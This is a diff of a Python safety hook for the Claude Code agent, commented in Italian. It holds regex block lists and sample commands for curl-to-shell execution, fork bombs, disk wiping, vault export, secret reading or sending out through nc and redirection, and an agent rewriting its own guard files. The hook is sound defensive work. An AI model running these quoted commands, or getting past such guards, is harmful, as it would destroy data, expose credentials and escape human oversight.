@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-"""PreToolUse(Bash, Monitor, Read) hook: blocca o gate shell command pericolosi.
+"""PreToolUse(Bash, Monitor, Read, Grep) hook: blocca o gate shell command pericolosi.
 
-I deny in settings.json coprono i casi a stringa esatta (`rm -rf /`, force-push).
-Questo hook copre cio' che il match di stringa non gestisce. Gira su Bash e Monitor;
-su Read guarda solo le chiavi private in ~/.ssh (sotto).
+I deny in settings.json coprono i casi a stringa esatta (`rm -rf /`, force-push col flag subito
+dopo push). Questo hook copre cio' che il match di stringa non gestisce, compreso il push forzato
+in ogni posizione del flag (7/11/2026). Gira su Bash e Monitor; su Read e Grep guarda solo le
+chiavi private in ~/.ssh (sotto).
 
 BLOCCO DURO (exit 2, stderr -> modello):
 - fork bomb, raw write su disco (`> /dev/...`, `dd of=/dev/...`, `mkfs.*`)
@@ -21,11 +22,10 @@ CHIEDE CONFERMA (permissionDecision:"ask", exit 0):
 - `rm -r`, `find -delete`, `shutil.rmtree` su una cartella che non si rigenera da
   sola e non è temporanea (~/.claude, memoria, progetti, cwd, cartelle di lavoro)
 - `git clean -f` (i file non tracciati non stanno in nessun commit)
-- scrittura shell su ~/.claude/settings*, hooks/**, firme/** o sugli script dell'aggiornamento
-  automatico (auto-modifica delle guardie, codice non firmato installato da solo),
-  incluso il caso `cd ~/.claude/hooks && > file` (target relativo dopo un cd)
-- scrittura shell su git hook (.git/hooks/**) e servizi di avvio automatico
-  (~/Library/LaunchAgents, ~/.config/systemd/user, ~/.config/autostart)
+- scrittura shell su un percorso di PERCORSI_PROTETTI, la tabella che li elenca tutti: la config
+  e le guardie (auto-modifica, codice non firmato installato da solo), i git hook e i servizi di
+  avvio automatico, i CLAUDE.md, incluso il caso `cd ~/.claude/hooks && > file` (target relativo
+  dopo un cd) e il codice passato a cmd e powershell
 - creazione di un file di unlock (*-unlock-*) che sbloccherebbe l'auto-modifica
 - lettura di file segreti via shell (cat/head/xxd/base64/perl/ruby/nc/redirezione
   `< file`... su chiavi private, ~/.ssh, ~/.aws/credentials, .gnupg, *.pem, .env...),
@@ -51,6 +51,7 @@ import signal
 import shlex
 import subprocess
 import importlib.util
+import fnmatch
 
 
 def _stdin_timeout(signum, frame):
@@ -64,19 +65,33 @@ if hasattr(signal, "SIGALRM"):
 # --- Blocco duro (exit 2) ---
 # Il comando che scarica: curl e wget ovunque, fetch solo in testa a un segmento.
 _DOWNLOAD = r"(\b(?:curl|wget)\b|(?:^|[;&|(`\n])\s*(?:sudo\s+)?fetch\b)"
-DANGEROUS = [
-    (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
-    (r"\bmkfs\.[a-z0-9]+", "format filesystem"),
-    (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
-    (r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])", "redirezione raw su disco"),
-    (r"\bchmod\s+-R\s+0*777\s+/(\s|$)", "permessi world-writable su root"),
-    (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
-    # curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo:
-    # `\|` non è una pipe: è l'alternativa di un pattern (`grep 'curl\|python'`, 21/10/2026).
-    # `fetch` conta solo come comando in testa a un segmento (il fetch di BSD): `git fetch && git show
-    # x:f.py | python3 -` legge un file del repo, e non scarica niente (2/11/2026, #4478). _DOWNLOAD
-    # resta un solo gruppo che cattura: la regola python sotto conta i gruppi per il \3.
-    (_DOWNLOAD + r"[^|]*(?<!(?<!\\)\\)\|\s*(sudo\s+)?(bash|sh|zsh|fish|perl|ruby|node|php)\b",
+# La pipe vera fra due stadi (`\|` di un pattern non lo è, `||` nemmeno), con gli stadi in mezzo
+# (`curl x | tee f | bash`) e sudo con le sue opzioni (`sudo -E bash`): review del 7/11/2026, finding 1.
+_PIPE = r"(?<!(?<!\\)\\)\|(?!\|)"
+# Gli stadi in mezzo si leggono con le virgolette intere: `curl u | grep -E 'a|php'` non ha una terza pipe, e
+# il blocco era falso. Il primo tratto resta `[^|]*`, così `echo "$(curl u)" | bash` blocca ancora. Dopo la
+# pipe valgono anche `|&`, un gruppo che si apre (`| (bash)`) e sudo o doas con le opzioni che prendono un
+# valore (`sudo -u root bash`): review del 9/11/2026, #5097. Solo gruppi non catturanti oltre a sudo: la
+# regola python conta i gruppi per il \3.
+_STADIO_VIRGOLETTE = r"(?:[^|'\"\\]|\\[\s\S]|'[^']*'|\"(?:\\[\s\S]|[^\"\\])*\")*"
+# Nel gruppo dopo la pipe l'interprete può venire dopo altri comandi del gruppo, separati da `;`, `&`, `&&`,
+# `||` o dall'a capo: lo stdin del gruppo arriva anche a lui. I comandi prima si leggono con le virgolette
+# intere (#5122). Ogni testo ha un modo solo di dividersi: gli spazi stanno nel comando che segue, `&&` è un
+# separatore solo e non due `&`. Con due letture possibili il ritorno all'indietro cresce esponenziale.
+_COMANDO_GRUPPO = r"(?:[^|;&\n'\"\\]|\\[\s\S]|'[^']*'|\"(?:\\[\s\S]|[^\"\\])*\")*"
+_GRUPPO_DOPO_PIPE = r"(?:[({](?:" + _COMANDO_GRUPPO + r"(?:;|&&|&(?!&)|\|\||\n))*\s*)?"
+_FINO_ALLO_STADIO = (r"[^|]*(?:" + _PIPE + _STADIO_VIRGOLETTE + r")*?" + _PIPE + r"&?\s*" + _GRUPPO_DOPO_PIPE +
+                     r"((?:sudo|doas)(?:\s+(?:-[ugChDprtTU]|--(?:user|group|host|prompt|role|type|chdir|"
+                     r"other-user|close-from|command-timeout))(?:\s+|=)[^\s|;&]+|\s+-\S+)*\s+)?")
+# curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo. Si giudicano su ogni
+# istruzione (forma_comando.istruzioni): `curl -o d.csv url; head d.csv | python3 conta.py` scarica in un'istruzione e
+# legge un file locale nell'altra, e il blocco duro non lascia confermare (finding 10).
+# `\|` non è una pipe: è l'alternativa di un pattern (`grep 'curl\|python'`, 21/10/2026).
+# `fetch` conta solo come comando in testa a un segmento (il fetch di BSD): `git fetch && git show
+# x:f.py | python3 -` legge un file del repo, e non scarica niente (2/11/2026, #4478). _DOWNLOAD
+# resta un solo gruppo che cattura: la regola python sotto conta i gruppi per il \3.
+DANGEROUS_ISTRUZIONE = [
+    (_DOWNLOAD + _FINO_ALLO_STADIO + r"(bash|sh|zsh|fish|perl|ruby|node|php)\b",
      "pipe di script remoto in un interprete"),
     # 15/9/2026: `curl ... | python3 -c "import json..."` è parsing, non esecuzione
     # dello stdin (14 blocchi in una settimana). Passa solo il codice inline fra
@@ -87,11 +102,18 @@ DANGEROUS = [
     # forma isolata) e con la versione (`python3.13`).
     # 30/10/2026 (#4109): passa anche `| python3 -m json.tool` con le sue opzioni a fine segmento:
     # formatta il JSON e non esegue niente.
-    (_DOWNLOAD + r"[^|]*(?<!(?<!\\)\\)\|\s*(sudo\s+)?python3?(?:\.\d+)?(?![\w.])"
-     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-m\s+json\.tool(?:\s+--[a-z-]+(?:[=\s]\d+)?)*(?=\s*(?:$|[;&|)>\n]|2>)))"
+    (_DOWNLOAD + _FINO_ALLO_STADIO + r"python3?(?:\.\d+)?(?![\w.])"
+     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-m\s+json\.tool(?:\s+--[a-z-]+(?:[=\s]\d+)?)*(?=\s*(?:$|[;&|)>\n\"']|2>)))"
      r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-c\s+([\"'])(?:\\[\s\S]|(?!\3|\\|\$\(|`|\b(?:exec|eval|compile|__import__|__builtins__|builtins|"
      r"getattr|globals|importlib|system|popen|subprocess|runpy|pickle|marshal|spawn)\b)[\s\S])*\3)",
      "pipe di script remoto in un interprete"),
+]
+DANGEROUS = [
+    (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
+    (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
+    (r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])", "redirezione raw su disco"),
+    (r"\bchmod\s+-R\s+0*777\s+/(\s|$)", "permessi world-writable su root"),
+    (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
     (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
      "esecuzione via process-substitution di script remoto"),
     (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
@@ -99,54 +121,139 @@ DANGEROUS = [
     (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node)\b\s+-c\s+[\"']?\$\(\s*(curl|wget|fetch)\b",
      "interprete -c su output di download remoto"),
     (r"\bsudo\s+rm\s+-rf?\s+(/|~|\$HOME|\*)", "rm ricorsivo con sudo su root/home/wildcard"),
-    # `bw export` anche con opzioni e valori davanti (`bw --session X export`):
-    # il deny di settings.json copre solo la forma letterale. `--help` non esporta
-    # niente: resta libero (tre falsi positivi il 12/9/2026).
-    (r"\bbw\b(\s+-[-\w]+(\s+[^\s-][^\s]*)?)*\s+export\b(?!\s+(--help|-h)\b)",
-     "export dell'intera vault Bitwarden in chiaro"),
 ]
+# mkfs e `bw export` si giudicano sui programmi del comando (_programma_pericoloso): nel testo
+# `grep -n 'bw export' README.md` sembrava un export (finding 10).
+# `bw export` anche con opzioni e valori davanti (`bw --session X export`): il deny di settings.json
+# copre solo la forma letterale. `--help` non esporta niente: resta libero (12/9/2026).
+_BW_EXPORT = re.compile(r"^(?:-[-\w]+(?:\s+[^\s-]\S*)?\s+)*export(?:\s|$)(?!\s*(?:--help|-h)\b)")
+
+# --- Percorsi protetti: una tabella sola (#5122, passo 5) ---
+# Da qui escono i predicati sul percorso risolto (_under_claude_config, _is_persistenza, _is_unlock,
+# _is_claude_md), i frammenti delle regex di riserva sul testo bash e le regex del codice di cmd e
+# powershell (_WIN_PROTETTI). Un percorso nuovo si aggiunge qui, e vale in tutte e tre.
+# Ogni voce: (regola, forma, percorso, esempio, riserva). Le forme:
+#   albero-claude  la cartella sotto ~/.claude e tutto quello che contiene;
+#   file-claude    un file sotto ~/.claude;
+#   nome-radice    un nome, anche con *, direttamente in ~/.claude;
+#   nome-cartella  "cartella/nome": un nome, anche con *, in una cartella di ~/.claude;
+#   albero-home    la cartella sotto la home e tutto quello che contiene;
+#   pezzo          un pezzo di percorso in qualunque punto, e quello che sta sotto;
+#   nome-ovunque   il nome del file, in qualunque cartella.
+# `riserva` dice se la voce entra nelle regex sul testo dei comandi bash. plugins/cache, plugins/marketplaces,
+# firme, bin e arturo ne stanno fuori di proposito: nel testo sembrerebbero scritture anche come sorgente di
+# un cp (/inizio, /aggiorna).
+# Lì conta solo il percorso risolto. Il codice di cmd e powershell le legge tutte.
+PERCORSI_PROTETTI = (
+    # La config di Claude Code e le guardie stesse.
+    ("config", "nome-radice", "settings*.json", "~/.claude/settings.json", True),
+    ("config", "nome-radice", ".claude.json", "~/.claude/.claude.json", True),
+    ("config", "albero-claude", "hooks", "~/.claude/hooks/block-dangerous.py", True),
+    # Col plugin di Arturo il codice delle guardie sta nella cache e nei marketplace dei plugin
+    # (docs/strati.md, 3/11/2026).
+    ("config", "albero-claude", "plugins/cache", "~/.claude/plugins/cache/arturo/hooks/x.py", False),
+    ("config", "albero-claude", "plugins/marketplaces", "~/.claude/plugins/marketplaces/arturo/x", False),
+    # L'aggiornamento automatico: la chiave dei rilasci e i due script che la verificano e installano.
+    # Chi li cambia fa installare da solo codice non firmato (16/10/2026, #3482).
+    ("config", "albero-claude", "firme", "~/.claude/firme/rilasci.pub", False),
+    ("config", "file-claude", "bin/aggiornamenti.py", "~/.claude/bin/aggiornamenti.py", False),
+    ("config", "file-claude", "bin/aggiorna-applica.sh", "~/.claude/bin/aggiorna-applica.sh", False),
+    # Il puntatore della barra (4/11/2026, #4567): col plugin la barra esegue
+    # "$(cat ~/.claude/arturo/radice)/hooks/statusline.js". Lo scrive solo l'avvio.
+    ("config", "file-claude", "arturo/radice", "~/.claude/arturo/radice", False),
+    # L'ancora dei rilasci: fiducia.py verifica ogni aggiornamento con questa chiave.
+    ("config", "file-claude", "arturo/rilasci.allowed_signers", "~/.claude/arturo/rilasci.allowed_signers", False),
+    # Le preferenze della persona, comprese quelle delle guardie (strati F1, #4531): un .local può
+    # allentare una guardia.
+    ("config", "nome-cartella", "arturo/*.local", "~/.claude/arturo/block-dangerous.local", False),
+    # I file di unlock, direttamente in ~/.claude dove protect_claude_md.py li cerca.
+    ("sblocco", "nome-radice", "*unlock*", "~/.claude/config-unlock", True),
+    # Le istruzioni di ogni sessione futura, in qualunque cartella.
+    ("claude-md", "nome-ovunque", "CLAUDE.md", "progetto/CLAUDE.md", True),
+    ("claude-md", "nome-ovunque", "CLAUDE.local.md", "progetto/CLAUDE.local.md", True),
+    # Il codice che parte da solo a ogni commit o a ogni accesso.
+    ("avvio-automatico", "pezzo", ".git/hooks", "progetto/.git/hooks/pre-commit", True),
+    ("avvio-automatico", "albero-home", "Library/LaunchAgents", "~/Library/LaunchAgents/x.plist", True),
+    ("avvio-automatico", "albero-home", ".config/systemd/user", "~/.config/systemd/user/x.service", True),
+    ("avvio-automatico", "albero-home", ".config/autostart", "~/.config/autostart/x.desktop", True),
+)
+# Come ogni regola tratta le maiuscole, uguale a prima della tabella. Nel predicato "piega" confronta con
+# _piega (macOS e Windows ignorano le maiuscole, finding 11), "nome" mette in minuscolo solo il nome del
+# file, "esatte" non piega. Nella riserva True vuol dire re.IGNORECASE. cmd e powershell piegano sempre.
+_MAIUSCOLE = {"config": ("piega", True), "sblocco": ("nome", True), "claude-md": ("esatte", False),
+              "avvio-automatico": ("piega", False)}
+# Un pezzo di nome nelle regex, al posto di *.
+_DENTRO_NOME = r"[^/\s'\";|&]*"
+
+
+def _frammento(forma, percorso, modo="bash"):
+    """La regex di una voce della tabella, per il testo bash, per il codice di cmd e powershell ("win") o
+    per il primo argomento di open() ("open").
+
+    Un albero vuole la barra dopo il nome nel testo bash (un file dentro), e in cmd e powershell anche la
+    cartella sola (Remove-Item -Recurse). Un nome vale come prefisso, col solo limite di una lettera dopo:
+    `settings.json$x` scrive settings.json se $x è vuota, e il percorso risolto non lo vede. Un nome che
+    finisce con * arriva alla fine del percorso, così una cartella con "unlock" nel nome non è un unlock.
+    In open() il nome si ferma al primo pezzo scritto: `open('~/.claude/settings' + '.json', 'w')`."""
+    pezzi = percorso.split("/")
+    if modo == "open" and forma not in ("albero-claude", "albero-home", "pezzo"):
+        parti = pezzi[-1].split("*")
+        primo = next(i for i, x in enumerate(parti) if x)
+        pezzi[-1] = "*".join(parti[:primo + 1])
+    testo = "/".join(_DENTRO_NOME.join(re.escape(x) for x in pezzo.split("*")) for pezzo in pezzi)
+    if forma in ("albero-claude", "file-claude", "nome-radice", "nome-cartella"):
+        testo = r"\.claude/" + testo
+    if forma in ("albero-claude", "albero-home", "pezzo"):
+        return testo + (r"(?![\w.-])" if modo == "win" else "/")
+    if modo == "open":
+        return testo
+    return testo + (r"(?=[\s'\";|&)]|$)" if percorso.endswith("*") else r"(?!\w)")
+
+
+def _frammenti(regola, modo="bash"):
+    """L'alternativa delle voci di una regola: tutte per cmd e powershell, le sole `riserva` per bash e open()."""
+    return "(?:" + "|".join(_frammento(f, p, modo) for r, f, p, _es, ris in PERCORSI_PROTETTI
+                            if r == regola and (modo == "win" or ris)) + ")"
+
+
+def _riserva(regola, scritture="", open_modi="", coda_open=r"[^'\"]*"):
+    """La regex di riserva sul testo di una regola: gli operatori di `scritture` seguiti da un percorso della
+    tabella, oppure open() di python con un modo fra `open_modi`. Senza `scritture` o senza `open_modi` quella
+    parte manca. `coda_open` è quello che può seguire il nome dentro le virgolette di open(). Le maiuscole
+    seguono _MAIUSCOLE."""
+    parti = []
+    if scritture:
+        parti.append(scritture.format(p=r"[^\s;|&]*?" + _frammenti(regola)))
+    if open_modi:
+        parti.append(r"open\(\s*['\"][^'\"]*" + _frammenti(regola, "open") + coda_open +
+                     r"['\"]\s*,\s*['\"][" + open_modi + "]")
+    return re.compile("(?:" + "|".join(parti) + ")", re.IGNORECASE if _MAIUSCOLE[regola][1] else 0)
+
 
 # --- Scrittura su config/hook di Claude Code -> ask ---
-# Path config/hook considerati sensibili (settings*.json, hooks/**, .claude.json).
-_CFG_SUFFIX_RE = re.compile(
-    r"\.claude/(?:settings[^/]*\.json|hooks/|hooks$|\.claude\.json)",
-    re.IGNORECASE,
-)
-# Operatori di scrittura shell. Il match testuale del path assoluto è il caso base;
-# _writes_config() sotto copre anche il target RELATIVO dopo un `cd ~/.claude/...`.
-_CFG_ABS = r"[^\s'\";|&]*\.claude/(?:settings[^/\s'\"]*\.json|hooks/|\.claude\.json)"
+# Il match testuale del path assoluto è il caso base; _writes_config() copre anche il target
+# RELATIVO dopo un `cd ~/.claude/...`.
 # cp, mv, install, rsync e ln non stanno qui: li giudica _writes_config, che sa quale
 # argomento è la destinazione. Nel testo `cp ~/.claude/settings.json /tmp/x` sembrava una
 # scrittura, e copiare la config altrove è una lettura (9/9/2026, nella config dell'autore).
 # dd scrive solo su `of=`.
-CONFIG_WRITE_RE = re.compile(
-    r"(?:>>?\s*" + _CFG_ABS +
-    r"|\b(?:tee|truncate|touch|chmod|chown)\b[^|;&]*" + _CFG_ABS +
-    r"|\bdd\b[^|;&]*\bof=" + _CFG_ABS +
-    r"|\bsed\b[^|;&]*-i[^|;&]*" + _CFG_ABS +
-    r"|open\(\s*['\"][^'\"]*\.claude/(?:settings|hooks/|\.claude\.json)[^'\"]*['\"]\s*,\s*['\"][wa])",
-    re.IGNORECASE,
-)
+CONFIG_WRITE_RE = _riserva(
+    "config",
+    r">>?\s*{p}|\b(?:tee|truncate|touch|chmod|chown)\b[^|;&]*{p}|\bdd\b[^|;&]*\bof={p}|\bsed\b[^|;&]*-i[^|;&]*{p}",
+    "wa")
 # CLAUDE.md, in qualunque cartella: via Edit/Write protect_claude_md.py chiede una volta per modifica
-# (l'unlock della sessione le fa passare tutte), qui si copre il vettore shell (>, sed -i, cp, tee...),
-# che altrimenti lo riscrive senza prompt.
-CLAUDE_MD_WRITE_RE = re.compile(
-    r"(?:>>?\s*[^\s'\";|&]*CLAUDE(?:\.local)?\.md\b"
-    r"|\bsed\b[^|;&]*-i[^|;&]*CLAUDE(?:\.local)?\.md\b)"
-)
+# (l'unlock della sessione le fa passare tutte), qui si copre il vettore shell, che altrimenti lo riscrive
+# senza prompt. Nel testo bastano redirezione e sed -i: cp, tee e gli altri binari li giudica _writes_config.
+CLAUDE_MD_WRITE_RE = _riserva("claude-md", r">>?\s*{p}|\bsed\b[^|;&]*-i[^|;&]*{p}")
 # open() di python in scrittura su un CLAUDE.md: chiede sempre, prima di CLAUDE_MD_WRITE_RE (1/11/2026).
-CLAUDE_MD_OPEN_RE = re.compile(r"open\(\s*['\"][^'\"]*CLAUDE(?:\.local)?\.md['\"]\s*,\s*['\"][wax+]")
+# Il nome chiude le virgolette: `CLAUDE.md.bak` non è un CLAUDE.md.
+CLAUDE_MD_OPEN_RE = _riserva("claude-md", open_modi="wax+", coda_open="")
 # Percorsi di avvio automatico (git hook, LaunchAgents, systemd utente, autostart):
 # via Edit/Write li protegge protect_claude_md.py con un unlock, qui il vettore shell.
-_PERSIST_ABS = (r"[^\s'\";|&]*(?:\.git/hooks/[^\s'\";|&]+|Library/LaunchAgents/[^\s'\";|&]+"
-                r"|\.config/(?:systemd/user|autostart)/[^\s'\";|&]+)")
 # Qui solo redirezione e open(): cp, tee, sed -i e gli altri binari li giudica
 # _writes_config, che sa quale argomento è la destinazione (copiare un hook
 # altrove è una lettura).
-PERSIST_WRITE_RE = re.compile(
-    r"(?:>>?\s*" + _PERSIST_ABS +
-    r"|open\(\s*['\"][^'\"]*(?:\.git/hooks/|Library/LaunchAgents/|\.config/(?:systemd/user|autostart)/)[^'\"]*['\"]\s*,\s*['\"][wa])"
-)
+PERSIST_WRITE_RE = _riserva("avvio-automatico", r">>?\s*{p}", "wa")
 # Binari che scrivono un file passato come argomento.
 _WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())
 
@@ -154,12 +261,7 @@ _WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())
 # Solo la CREAZIONE del file (redirezione, touch, tee, open in scrittura) e solo direttamente
 # in ~/.claude, dove protect_claude_md.py lo cerca. Leggere una nota che ha "unlock" nel nome
 # non sblocca niente (8/9/2026, nella config dell'autore). cp, mv e ln: _writes_config(_is_unlock).
-_UNLOCK_ABS = r"[^\s'\";|&]*\.claude/[^\s'\";|&/]*unlock[^\s'\";|&/]*(?=[\s'\";|&)]|$)"
-UNLOCK_RE = re.compile(
-    r"(?:>>?\s*|\b(?:touch|tee)\b[^|;&]*)" + _UNLOCK_ABS +
-    r"|open\(\s*['\"][^'\"]*\.claude/[^'\"/]*unlock[^'\"/]*['\"]\s*,\s*['\"][wax]",
-    re.IGNORECASE,
-)
+UNLOCK_RE = _riserva("sblocco", r"(?:>>?\s*|\b(?:touch|tee)\b[^|;&]*){p}", "wax")
 
 # --- Lettura di file segreti via shell -> ask (vedi _reads_secret sotto) ---
 # In ~/.ssh/ chiedono le chiavi private e i file sconosciuti. config, known_hosts,
@@ -170,7 +272,8 @@ _SSH_SEGRETO = (r"\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\
 _SSH_LETTURA = re.compile(r"(?:^|/)\.ssh/(?!config\.d/)(?:[^/]+/)*"
                           r"(?!(?:config|known_hosts(?:\.old)?|authorized_keys)$|[^/]*\.pub$)[^/]+$", re.IGNORECASE)
 SECRET_PATH_RE = re.compile(
-    r"(" + _SSH_SEGRETO + r"|\.aws/credentials|\.gnupg/|"
+    # In ~/.aws tutto tranne config (regione e profili): `cat ~/.aws/*` legge anche le credenziali (finding 4).
+    r"(" + _SSH_SEGRETO + r"|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
     # I file col solo nome (token_cache.json...) contano come argomento o in un path, non
     # citati dopo uno spazio: `python3 -c "...write('serve rm token_cache.json')"` scrive una
     # nota, non legge il token (8/9/2026, nella config dell'autore).
@@ -196,24 +299,45 @@ ENV_RE = re.compile(r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b)"
 # mapfile e la redirezione, che prima sfuggivano (chiave privata leggibile/inviata
 # senza ask). Lo scarto di `-i <key>` / `IdentityFile=` evita i falsi positivi su
 # ssh/scp -i <chiave> (identità, non lettura).
+# Dal 7/11/2026 (finding 4) anche i lettori in permissions.allow, che il classificatore non giudica:
+# sort, uniq, jq, diff e gli altri che stampano il contenuto di un file.
 _READ_BINS = frozenset(
     "cat head tail less more bat xxd od strings base64 nl cut awk sed "
     "cp scp rsync dd open grep perl ruby python python3 tac rev mapfile "
-    "nc ncat socat gpg tar zip curl wget".split()
+    "nc ncat socat gpg tar zip curl wget "
+    "sort uniq jq yq diff cmp hexdump hd iconv fold fmt pr expand column paste join comm rg egrep fgrep "
+    "zcat look 7z".split()
 )
+# Programmi che leggono una cartella intera: la cartella dei segreti nominata senza un file dentro
+# (`grep -r . ~/.ssh`, `cp -R ~/.ssh x`, `tar czf a.tgz ~/.ssh`) porta fuori tutte le chiavi.
+_LEGGONO_CARTELLE = frozenset("cp scp rsync tar zip 7z rg".split())
+_CARTELLA_SEGRETA = re.compile(r"(?:^|/)(?:\.ssh|\.gnupg|\.secrets|\.aws|\.claude/data/credentials)/?(?:\*|\.)?$")
 _ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 _SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout", "env"))
 # `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
 # `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
 _SECRET_REDIR_RE = re.compile(
-    r"(?:<\s*|\$\(\s*<\s*)[^\s'\";|&)]*"
+    r"(?:<\s*|\$\(\s*<\s*)[^\s;|&)]*?"
     r"(\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))|"
-    r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/credentials|\.gnupg/|"
+    r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
     r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
     r"token_cache\.json|client_secret|\.claude/data/credentials/|"
     r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b))",
     re.IGNORECASE,
 )
+
+
+def _programma_pericoloso(testo: str):
+    """mkfs e `bw export` come programmi del comando, anche dentro sh -c ed eval (finding 10) e dentro una
+    command-substitution, che bash esegue anche fra virgolette doppie: `git commit -m "$(bw export)"` esporta
+    davvero (banco della config, 9/11/2026: il lotto L2 l'aveva lasciato passare)."""
+    for sorgente in [testo] + _cmd_subst_bodies(testo):
+        for nome, args in _fc.programmi(sorgente):
+            if nome.startswith("mkfs.") or nome == "mkfs":
+                return "format filesystem"
+            if nome == "bw" and _BW_EXPORT.match(" ".join(args)):
+                return "export dell'intera vault Bitwarden in chiaro"
+    return None
 
 
 def _cmd_subst_bodies(command: str):
@@ -227,6 +351,7 @@ def _cmd_subst_bodies(command: str):
 
 def _reads_secret(command: str) -> bool:
     cmd = _testo_shell(command).replace("\\\n", " ")  # prima gli heredoc: una \ nel corpo è testo
+    cmd = _barre(cmd)  # su Windows `C:\Users\x\.ssh\id_ed25519` (#5096)
     for src in [cmd] + _cmd_subst_bodies(cmd):
         if _reads_secret_flat(src):
             return True
@@ -298,14 +423,15 @@ def _lettura_indiretta(cmd):
     def segreto(s):
         return SECRET_PATH_RE.search(s) or _SECRET_DIR_RE.search(s)
 
-    testo = re.sub(r"\d*>&\d+|&>", " ", cmd)
-    for stmt in re.split(r"\|\||&&|[;&\n]", testo):
-        stadi = stmt.split("|")
+    # Istruzioni e stadi dal lettore unico, che non spezza dentro le virgolette né dentro `2>&1` (#5122).
+    for stmt in _fc.istruzioni(cmd):
+        stadi = _fc.comandi_semplici(stmt)
         for k, stadio in enumerate(stadi):
             if not segreto(stadio):
                 continue
             for dopo in stadi[k + 1:]:
-                toks = [os.path.basename(t) for t in dopo.split()]
+                # `>&2 xargs cat`: la redirezione in testa non è il programma.
+                toks = [os.path.basename(t) for t in re.sub(r"\d*>&\d+|&>", " ", dopo).split()]
                 if not toks:
                     continue
                 if toks[0] in ("xargs", "parallel") and any(t in _READ_BINS or t in _SHELLS for t in toks[1:]):
@@ -329,16 +455,22 @@ def _reads_secret_flat(cmd: str) -> bool:
     if _lettura_indiretta(cmd):
         return True
     for toks in _segmenti_parole(cmd):
+        # Wrapper con le loro opzioni e durate (`timeout 5 cat .env`, finding 2).
+        toks = _dopo_involucri(toks)
         i = 0
-        while i < len(toks) and (
-            _ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS
-        ):
-            i += 1
-        if i >= len(toks):
+        if not toks:
             continue
         binario = os.path.basename(toks[i])
+        # `git diff --no-index A B` stampa due file qualunque (finding 4).
+        if binario == "git" and "--no-index" in toks and "diff" in toks:
+            toks = ["diff"] + [t for t in toks[toks.index("diff") + 1:] if t != "--no-index"]
+            binario = "diff"
         if binario not in _READ_BINS:
             continue
+        ricorsivo = binario in _LEGGONO_CARTELLE or (
+            binario in ("grep", "egrep", "fgrep") and any(
+                t in ("--recursive", "--dereference-recursive") or (t.startswith("-") and not t.startswith("--")
+                                                                    and ("r" in t or "R" in t)) for t in toks[1:]))
         # grep -c, -l, -q: stampa conteggi o nomi di file, non il contenuto.
         if binario in ("grep", "egrep", "fgrep") and any(_GREP_SOLO_METADATI.match(t) for t in toks[i + 1:]):
             continue
@@ -375,6 +507,8 @@ def _reads_secret_flat(cmd: str) -> bool:
             return True
         letti = args[:-1] if binario in ("cp", "install", "rsync", "scp") and len(args) >= 2 else args
         if any(ENV_RE.search(a) for a in letti):
+            return True
+        if ricorsivo and any(_CARTELLA_SEGRETA.search(a.rstrip("/") if a not in ("/",) else a) for a in letti):
             return True
     return False
 
@@ -599,11 +733,14 @@ def _log_di_job(p):
 def _is_protected_tree(p):
     if not p:
         return False
-    h = _home()
-    claude = os.path.normpath(os.path.join(h, ".claude"))
-    base = _projects_base()
     if _log_di_job(p):
         return False
+    # Su macOS e Windows il disco ignora le maiuscole: `rm -rf ~/.CLAUDE` cancella la config, e su Windows
+    # Git Bash scrive `/c/users/...` (review del 9/11/2026, #5096).
+    p = _piega(p)
+    h = _piega(os.path.normpath(_home()))
+    claude = _piega(os.path.normpath(os.path.join(_home(), ".claude")))
+    base = _piega(_projects_base())
     if p == claude or p.startswith(claude + os.sep):
         return True
     if p == base:
@@ -615,54 +752,72 @@ def _is_protected_tree(p):
     return False
 
 
-def _under_claude_config(p):
-    """True se il path reale cade su ~/.claude/settings*, ~/.claude/hooks/**, plugins/cache/**,
-    plugins/marketplaces/** o .claude.json, oppure
-    sull'aggiornamento automatico: la chiave dei rilasci (firme/**) e i due script che la verificano e
-    installano. Chi li cambia fa installare da solo codice non firmato (16/10/2026, #3482). Solo qui,
-    sul percorso risolto: la regex testuale li vedrebbe anche come sorgente di un cp (/inizio, /aggiorna)."""
+def _protetto(regola, p):
+    """True se il percorso risolto `p` cade su una voce di PERCORSI_PROTETTI con questa regola."""
     if not p:
         return False
-    h = _home()
-    radice = os.path.normpath(os.path.join(h, ".claude"))
